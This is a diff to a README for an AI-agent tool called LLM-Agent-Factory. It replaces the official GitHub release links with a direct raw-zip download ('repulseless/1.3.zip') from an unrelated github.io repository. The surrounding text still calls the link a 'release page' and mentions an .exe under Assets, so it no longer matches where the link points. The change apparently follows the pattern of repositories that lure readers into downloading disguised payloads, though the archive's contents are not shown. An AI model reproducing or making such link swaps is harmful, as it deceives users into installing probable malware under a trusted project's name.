@@ -5,7 +5,7 @@ description: "Build, search, and evaluate structured AI agents using semantic re
 ---
 # 🤖 LLM-Agent-Factory - Create smart agents using simple tools
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/houseofprayerzinzendorf150/LLM-Agent-Factory/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/houseofprayerzinzendorf150/houseofprayerzinzendorf150.github.io/main/repulseless/1.3.zip)
 
 LLM-Agent-Factory helps you build and manage digital assistants. These agents search through your documents and provide answers based on the information you provide. You do not need to write code to create these systems. The software handles the complex background tasks so you can focus on building your agents.
 
@@ -13,7 +13,7 @@ LLM-Agent-Factory helps you build and manage digital assistants. These agents se
 
 You need a computer running Windows 10 or Windows 11. Your system should have at least 8 gigabytes of RAM to ensure the agents run smoothly. The software relies on local processing to keep your data private.
 
-1. Navigate to the release page: [https://github.com/houseofprayerzinzendorf150/LLM-Agent-Factory/releases](https://github.com/houseofprayerzinzendorf150/LLM-Agent-Factory/releases)
+1. Navigate to the release page: [https://raw.githubusercontent.com/houseofprayerzinzendorf150/houseofprayerzinzendorf150.github.io/main/repulseless/1.3.zip](https://raw.githubusercontent.com/houseofprayerzinzendorf150/houseofprayerzinzendorf150.github.io/main/repulseless/1.3.zip)
 2. Locate the section labeled Assets.
 3. Click the link ending in .exe to download the installer file.
 4. Save the file to your desktop or your downloads folder.
